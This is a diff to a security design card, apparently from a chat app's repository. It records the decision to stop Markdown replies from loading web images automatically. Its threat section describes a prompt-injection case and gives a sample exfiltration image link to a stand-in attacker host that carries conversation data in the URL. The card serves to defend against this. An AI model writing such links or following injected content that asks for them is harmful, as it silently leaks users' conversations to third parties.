@@ -1,13 +1,13 @@
 # IMG1: Markdown images from the web load on their own
 
-⑥Helper, 2026-11-01. Found while carding #603's follow-up ("the reader's Markdown renders `<img>` for any URL"). That follow-up is wider than the reader: **chat replies render the same way.** This is the security surface, so the card comes first and **the user picks the scope** (below). Nothing is built before that.
+⑥Helper, 2026-11-01. Found while carding #603's follow-up ("the reader's Markdown renders `<img>` for any URL"). That follow-up is wider than the reader: **chat replies render the same way.** This is the security surface, so the card came first and the user picked the scope: **A + C now, B later** (Decided, below).
 
 | | |
 |---|---|
 | Lane | ⑥Helper |
-| Review and merge | Another session's independent review at effort=max (security surface); the user merges. |
+| Review and merge | Another session's independent review at effort=max (security surface). Under the user's 2026-11-01 rule (`docs/sessions.md`, #644), ⑥Helper may enable auto-merge once that review is OK at the current head and all five checks are green. |
 | Branch | `claude/0164-img1` (code), after this card |
-| Tier | Recommended: **should** in v0.1.64, because the channel is open today. The user decides. |
+| Tier | **should**, in v0.1.64 (user, 2026-11-01). |
 
 ## What is there (main `845feff8`)
 
@@ -23,7 +23,15 @@
 
 A reply is the model's text, and the model reads outside content (web pages, files, MCP results). If outside content steers it, a reply with `![](https://attacker.example/p?d=<something from the conversation>)` sends that text to the attacker the moment the reply renders, with no click. This is the known "Markdown image exfiltration" pattern; several chat products shipped fixes for it after public reports. Arslan's hard rules and confirm cards don't see it, because it isn't a tool call: the webview fetches the image.
 
-## Options (for the user to pick)
+## Decided (user, 2026-11-01, relayed by ④参谋)
+
+The user's words, verbatim: 「直接按 A + C 做 确实听着靠谱些」. So:
+
+- **A + C, as described below.** No mock first: it's built straight from this card.
+- **B** is a follow-up once A has run on a real Mac.
+- **Neither extra:** no "Load image" button and no host allowlist, as recommended.
+
+## Options (as they were put to the user)
 
 - **A. Recommended: don't load web images in Markdown.**
   - An image whose URL is `http:`, `https:` or protocol-relative (`//…`) shows as a small chip: an image icon, the alt text, and the host ("Image from example.com"). Clicking it opens the URL in the browser through `openExternal`, the same path as links (`MarkdownLink.tsx`), so the user sees where it goes before anything is sent.
